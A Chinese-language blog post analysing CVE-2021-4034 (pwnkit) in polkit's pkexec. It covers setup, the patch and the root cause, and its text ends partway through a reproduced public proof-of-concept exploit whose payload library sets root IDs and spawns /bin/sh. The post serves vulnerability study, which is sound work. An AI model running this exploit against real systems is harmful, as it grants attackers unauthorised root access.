<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="fa1lr4in">
    
    <title>
        
            CVE-2021-4034 pwnkit linux本地提权漏洞分析 |
        
        fa1lr4in&#39;s blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/logo.svg">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/css/font-awesome.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"fa1lr4in.github.io","root":"/","language":"en","path":"search.json"};
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.svg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"男儿何不带吴钩，收取关山五十州。"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.5"};
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
  </script>
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
</head>


<body>
<div class="progress-bar-container">
    

    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            <header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                fa1lr4in&#39;s blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                HOME
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                ARCHIVES
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                CATEGORIES
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                TAGS
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                ABOUT
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">HOME</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">ARCHIVES</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">CATEGORIES</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">TAGS</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">ABOUT</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="article-content-container">

        <div class="article-title">
            <span class="title-hover-animation">CVE-2021-4034 pwnkit linux本地提权漏洞分析</span>
        </div>

        
            <div class="article-header">
                <div class="avatar">
                    <img src="/images/avatar.svg">
                </div>
                <div class="info">
                    <div class="author">
                        <span class="name">fa1lr4in</span>
                        
                            <span class="author-label">Lv2</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fas fa-edit"></i>&nbsp;
        <span class="pc">2022-07-20 16:27:03</span>
        <span class="mobile">2022-07-20 16:27</span>
    </span>
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/linux/">linux</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>3.4k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>14 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        <div class="article-content markdown-body">
            <h1 id="CVE-2021-4034-pwnkit-linux-local-privilege-escalation-vulnerability-analysis"><a href="#CVE-2021-4034-pwnkit-linux-local-privilege-escalation-vulnerability-analysis" class="headerlink" title="CVE-2021-4034 pwnkit linux local privilege escalation vulnerability analysis"></a>CVE-2021-4034 pwnkit linux local privilege escalation vulnerability analysis</h1><h2 id="一、foreword"><a href="#一、foreword" class="headerlink" title="一、foreword"></a>一、foreword</h2><p>2022-01-25，<a class="link"   target="_blank" rel="noopener" href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt" >Qualys<i class="fas fa-external-link-alt"></i></a>发布CVE-2021-4034漏洞详情，并将其命名为pwnkit。该漏洞由于程序未对argv为0的情况做判断，导致越界读写，通过在argv后面传入envp的方式可以读写envp[0]的值，最终导致本地提权。</p>
<h2 id="二、Pre-knowledge"><a href="#二、Pre-knowledge" class="headerlink" title="二、Pre-knowledge"></a>二、Pre-knowledge</h2><h3 id="2-1-polkit"><a href="#2-1-polkit" class="headerlink" title="2.1 polkit"></a>2.1 polkit</h3><p>Polkit 是一个应用程序级别的工具集，通过定义和审核权限规则，实现不同优先级进程间的通讯：控制决策集中在统一的框架之中，决定低优先级进程是否有权访问高优先级进程。</p>
<p>Polkit 在系统层级进行权限控制，提供了一个低优先级进程和高优先级进程进行通讯的系统。和 sudo 等程序不同，Polkit 并没有赋予进程完全的 root 权限，而是通过一个集中的策略系统进行更精细的授权。其系统架构由授权和身份验证代理组成，如下图所示：</p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/4153611350.png" alt="4153611350"></p>
<p>其中授权以基于system message bus上的服务实现，polkit没有取代系统已有的权限系统，而是在已有的群组和管理员上进行管控。如果开发时需要用到linux上的身份认证，可以基于polkit框架，编写rule授权规则实现。</p>
<p>而pkexec就是polkit中的一个组件，允许用户以另一个用户身份执行命令（用法类似于sudo）:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─<span class="comment"># pkexec --help                                                                                                                                                                </span></span><br><span class="line">pkexec --version |</span><br><span class="line">       --<span class="built_in">help</span> |</span><br><span class="line">       --disable-internal-agent |</span><br><span class="line">       [--user username] PROGRAM [ARGUMENTS...]</span><br></pre></td></tr></table></figure>

<p>如果 PROGRAM未指定，将运行默认shell，如果username未指定，则程序将以管理超级用户root身份执行。</p>
<h3 id="2-2-Polkit-source-installation"><a href="#2-2-Polkit-source-installation" class="headerlink" title="2.2 Polkit source installation"></a>2.2 Polkit source installation</h3><p>这里安装Polkit漏洞环境，参照了<a class="link"   target="_blank" rel="noopener" href="https://gitlab.freedesktop.org/polkit/polkit/-/tree/master" >官方的源码编译流程<i class="fas fa-external-link-alt"></i></a>，方便调试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://gitlab.freedesktop.org/polkit/polkit/</span><br><span class="line">git reset --hard 4ff1abe4a4c1f8c8378b9eaddb0346ac6448abd8			<span class="comment"># 漏洞修复的前一个版本</span></span><br><span class="line"><span class="comment"># git reset --hard a2bf5c9c83b6ae46cbd5c779d3055bff81ded683			# 漏洞修复的commit</span></span><br><span class="line">meson setup install								<span class="comment"># 这里的install代表安装目录。这里可能要解决各种库的安装，建议做好虚拟机快照，否则容易被各种依赖搞崩溃。</span></span><br><span class="line">meson compile -C install					<span class="comment">#  将编译的文件放入install目录中</span></span><br><span class="line">meson install -C install		<span class="comment"># 应用到生产环境中</span></span><br></pre></td></tr></table></figure>

<p>meson setup后会有如下的提示，如果出现该提示代表成功了</p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220719142635354.png" alt="image-20220719142635354"></p>
<p>在meson compile后可以在install目录下找到pkexec可执行文件，之后就可以进行源码调试了。</p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220719142802510.png" alt="image-20220719142802510"></p>
<h3 id="2-3-suid"><a href="#2-3-suid" class="headerlink" title="2.3 suid"></a>2.3 suid</h3><p> SUID (<strong>S</strong>et owner <strong>U</strong>ser <strong>ID</strong> up on execution) 是Linux中的一种特殊权限，其功能为用户运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。但是SUID权限的设置只针对二进制可执行文件，对于非可执行文件设置SUID没有任何意义.</p>
<p> 在执行过程中，调用者会暂时获得该文件的所有者权限,且该权限只在程序执行的过程中有效。 通俗的来讲,假设我们现在有一个可执行文件<code>ls</code>,其属主为root，当我们通过非root用户登录时，如果<code>ls</code>设置了SUID权限，我们可在非root用户下运行该二进制可执行文件,在执行文件时,该进程的权限将为root权限。</p>
<p>我们简单看一下如何设置SUID权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u+s filename   设置SUID位</span><br><span class="line">chmod u-s filename   去掉SUID设置</span><br></pre></td></tr></table></figure>

<p><code>ls -al</code>查看文件权限</p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220720104735325.png" alt="image-20220720104735325"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod u+s 1</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220720104812541.png" alt="image-20220720104812541"></p>
<p>可以看到<code>1</code>文件的权限描述符由<code>-rwxr-x---</code>变为<code>-rwsr-x---</code>，这代表该文件已经获得了suid权限。</p>
<h2 id="三、Vulnerability-Analysis"><a href="#三、Vulnerability-Analysis" class="headerlink" title="三、Vulnerability Analysis"></a>三、Vulnerability Analysis</h2><h3 id="3-1-Patch-Analysis"><a href="#3-1-Patch-Analysis" class="headerlink" title="3.1 Patch Analysis"></a>3.1 Patch Analysis</h3><p>补丁链接： <a class="link"   target="_blank" rel="noopener" href="https://gitlab.freedesktop.org/polkit/polkit/-/commit/a2bf5c9c83b6ae46cbd5c779d3055bff81ded683" >https://gitlab.freedesktop.org/polkit/polkit/-/commit/a2bf5c9c83b6ae46cbd5c779d3055bff81ded683<i class="fas fa-external-link-alt"></i></a></p>
<p>补丁对argc进行了校验，之后对argv的存在做了判断，如果存在对其进行写入，这里判断该漏洞可能利用了argc为0的情况，并越界写argv[n]导致内存溢出。</p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220718170014163.png" alt="image-20220718170014163"></p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220718170048590.png" alt="image-20220718170048590"></p>
<p>上面对补丁做了简单的分析，之后对漏洞的成因进行分析。</p>
<h3 id="3-2-Root-Cause-Analysis"><a href="#3-2-Root-Cause-Analysis" class="headerlink" title="3.2 Root Cause Analysis"></a>3.2 Root Cause Analysis</h3><p>这里的根因分析主要参考了 <a class="link"   target="_blank" rel="noopener" href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt" >https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt<i class="fas fa-external-link-alt"></i></a> 与 <a class="link"   target="_blank" rel="noopener" href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt" >https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt<i class="fas fa-external-link-alt"></i></a></p>
<p>上面已经提到过：pkexec允许用户以另一个用户身份执行PROGRAM。如果未指定 PROGRAM，则将运行默认 shell。如果未指定用户名，则程序将以  root 身份执行。</p>
<p>pkexec.c的 <a class="link"   target="_blank" rel="noopener" href="https://gitlab.freedesktop.org/polkit/polkit/-/blob/4ff1abe4a4c1f8c8378b9eaddb0346ac6448abd8/src/programs/pkexec.c#L534" >534-568行<i class="fas fa-external-link-alt"></i></a>是pkexec处理命令行参数的代码，在 <a class="link"   target="_blank" rel="noopener" href="https://gitlab.freedesktop.org/polkit/polkit/-/blob/4ff1abe4a4c1f8c8378b9eaddb0346ac6448abd8/src/programs/pkexec.c#L610" >610-640 行<i class="fas fa-external-link-alt"></i></a>代码中，会获取PROGRAM参数名称，也就是需要执行的程序。</p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220719105731688.png" alt="image-20220719105731688"></p>
<p>这里会存在一个问题，如果命令行参数 argc 的数量为 0（ execve()  的 argv 参数为空，即 {NULL})，那么argv[0] 为 NULL。则会导致：</p>
<ol>
<li><p>在第 534 行，整数 n 永久设置为 1；</p>
</li>
<li><p>在第 610 行，由于argv只有一个元素 argv[0]， argv[1] 将会越界读取指针路径；</p>
</li>
<li><p>在第 639 行，指针 s 被越界写入 argv[1]。</p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">435</span> main (<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[]) </span><br><span class="line"> <span class="number">436</span> &#123; </span><br><span class="line"> ... </span><br><span class="line"> <span class="number">534</span> <span class="keyword">for</span> (n = <span class="number">1</span>; n &lt; (guint ) argc; n++) </span><br><span class="line"> <span class="number">535</span> &#123; </span><br><span class="line"> ... </span><br><span class="line"> <span class="number">568</span> &#125; </span><br><span class="line"> ... </span><br><span class="line"> <span class="number">610</span> path = g_strdup (argv[n]); </span><br><span class="line"> ... </span><br><span class="line"> <span class="number">629</span> <span class="keyword">if</span> (path[<span class="number">0</span>] != <span class="string">&#x27;/&#x27;</span>) </span><br><span class="line"> <span class="number">630</span> &#123; </span><br><span class="line"> ... </span><br><span class="line"> <span class="number">632</span> s = g_find_program_in_path (path); </span><br><span class="line"> ... </span><br><span class="line"> <span class="number">639</span> argv[n] = path = s; </span><br><span class="line"> <span class="number">640</span> &#125; </span><br></pre></td></tr></table></figure>

<p>这时我们得到了一个越界读写，也就是argv[1]的位置，那么argv[1]是什么呢，先说结论，argv与envp的内存空间是紧邻的，也就是说argv的最后一个元素argv[lartest]与envp的第一个元素envp[0]内存空间相邻。内存布局如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|---------+---------+-----+------------|---------+---------+-----+------------| </span><br><span class="line">| argv[0] | argv[1] | ... | argv[argc] | envp[0] | envp[1] | ... | envp[envc] | </span><br><span class="line">|----|----+----|----+-----+-----|------|----|----+----|----+-----+-----|------| </span><br></pre></td></tr></table></figure>

<p>编写代码验证下，直接参考 <a class="link"   target="_blank" rel="noopener" href="https://saucer-man.com/information_security/876.html" >saucerman师傅博客<i class="fas fa-external-link-alt"></i></a> 的代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// a.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span>** envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;argv[1]:%s\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// b.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *a_argv[]=&#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">    <span class="keyword">char</span> *a_envp[]=&#123;</span><br><span class="line">        <span class="string">&quot;lol&quot;</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    &#125;;</span><br><span class="line">    execve(<span class="string">&quot;./a&quot;</span>, a_argv, a_envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220719112328865.png" alt="image-20220719112328865"></p>
<p>编译debug模式调试也可以验证，argv[lartest]与envp[0]的内存是紧邻的。</p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220719112603267.png" alt="image-20220719112603267"></p>
<p>顺着这个思路，再次回看代码</p>
<ol>
<li>假设我们执行pkexec，此时argc={ NULL }，envp={“xxx”}</li>
<li>610行，程序会读取argv[1]到path变量中，也就是”xxx”</li>
<li>632行，<code>s = g_find_program_in_path (path)</code>找到该程序的绝对路径，假设为/usr/bin/xxx</li>
<li>639行，程序将s写入argv[1]和path，从而覆盖了第一个环境变量。此时envp[0]也就变成了{“/usr/bin/xxx”}</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">435</span> main (<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[]) </span><br><span class="line"> <span class="number">436</span> &#123; </span><br><span class="line"> ... </span><br><span class="line"> <span class="number">534</span> <span class="keyword">for</span> (n = <span class="number">1</span>; n &lt; (guint ) argc; n++) </span><br><span class="line"> <span class="number">535</span> &#123; </span><br><span class="line"> ... </span><br><span class="line"> <span class="number">568</span> &#125; </span><br><span class="line"> ... </span><br><span class="line"> <span class="number">610</span> path = g_strdup (argv[n]); </span><br><span class="line"> ... </span><br><span class="line"> <span class="number">629</span> <span class="keyword">if</span> (path[<span class="number">0</span>] != <span class="string">&#x27;/&#x27;</span>) </span><br><span class="line"> <span class="number">630</span> &#123; </span><br><span class="line"> ... </span><br><span class="line"> <span class="number">632</span> s = g_find_program_in_path (path); </span><br><span class="line"> ... </span><br><span class="line"> <span class="number">639</span> argv[n] = path = s; </span><br><span class="line"> <span class="number">640</span> &#125; </span><br></pre></td></tr></table></figure>

<p>也就是说，这种越界写入允许我们将一个“不安全”的环境变量（例如，LD_PRELOAD）重新引入pkexec的环境。但是这个环境变量并不会存在太久，因为在702行，程序会清除所有的环境变量：</p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220719114816552.png" alt="image-20220719114816552"></p>
<h3 id="3-3-Exploit"><a href="#3-3-Exploit" class="headerlink" title="3.3 Exploit"></a>3.3 Exploit</h3><p>通过上面的分析可以得出，环境变量的生命周期存在于639行<del>702行之间，也就是说我们在639行</del>702行之间找出一段可以执行命令的代码即可完成漏洞利用（因为pkexec是默认具有suid权限的）。</p>
<p>我们关注到了g_printerr()函数。如果环境变量CHARSET不是UTF-8，g_printerr()将会调用glibc的函数iconv_open()，来将消息从UTF-8转换为另一种格式。iconv_open函数的执行过程为：iconv_open函数首先会找到系统提供的gconv-modules配置文件（可以通过GCONV_PATH环境变量指定的路径来寻找），这个文件中包含了各个字符集的相关信息存储的路径，每个字符集的相关信息存储在一个.so文件中，即gconv-modules文件提供了各个字符集的.so文件所在位置，之后会调用.so文件中的gconv()与gonv_init()函数。</p>
<p>如果我们改变了系统的GCONV_PATH环境变量，也就能改变gconv-modules配置文件的位置，从而执行一个恶意的so文件实现任意命令执行。</p>
<p>上面的过程刚刚接触可能比较难以理解，我们可以通过公开的exp来更加理解下这个漏洞。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * blasty-vs-pkexec.c -- by blasty &lt;peter@haxx.in&gt; </span></span><br><span class="line"><span class="comment"> * ------------------------------------------------</span></span><br><span class="line"><span class="comment"> * PoC for CVE-2021-4034, shout out to Qualys</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * ctf quality exploit</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * bla bla irresponsible disclosure</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * -- blasty // 2022-01-25</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fatal</span><span class="params">(<span class="keyword">char</span> *f)</span> </span>&#123;</span><br><span class="line">    perror(f);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">compile_so</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    FILE *f = fopen(<span class="string">&quot;payload.c&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        fatal(<span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> so_code[]=</span><br><span class="line">        <span class="string">&quot;#include &lt;stdio.h&gt;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;#include &lt;stdlib.h&gt;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;#include &lt;unistd.h&gt;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;void gconv() &#123;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;  return;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;&#125;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;void gconv_init() &#123;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;  setuid(0); seteuid(0); setgid(0); setegid(0);\n&quot;</span></span><br><span class="line">        <span class="string">&quot;  static char *a_argv[] = &#123; \&quot;sh\&quot;, NULL &#125;;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;  static char *a_envp[] = &#123; \&quot;PATH=/bin:/usr/bin:/sbin\&quot;, NULL &#125;;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;  execve(\&quot;/bin/sh\&quot;, a_argv, a_envp);\n&quot;</span></span><br><span class="line">        <span class="string">&quot;  exit(0);\n&quot;</span></span><br><span class="line">        <span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    fwrite(so_code, <span class="built_in">strlen</span>(so_code), <span class="number">1</span>, f);</span><br><span class="line">    